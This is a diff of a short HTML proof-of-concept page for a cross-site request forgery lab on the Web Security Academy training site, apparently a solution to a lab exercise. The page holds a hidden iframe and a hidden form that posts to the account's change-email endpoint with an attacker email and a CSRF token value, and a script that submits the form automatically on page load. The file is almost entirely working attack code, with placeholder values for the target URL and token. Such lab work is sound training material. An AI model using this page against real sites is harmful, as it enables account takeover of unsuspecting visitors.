@@ -1,9 +1,9 @@
 <html>
 	<body>
 		<iframe style="display:none" name="csrf-iframe"></iframe>      
-		<form action="https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+		<form action="https://xxxxxxxxxxxxxURLxxxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
 			<input type="hidden" name="email" value="test@attacker.com" />
-			<input type="hidden" name="csrf" value="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" />
+			<input type="hidden" name="csrf" value="xxxxxxxxxxxxxxCSRFxxxxxxxxxxxxxx" />
 		</form>
 		<script>
 			document.getElementById('csrf-form').submit();
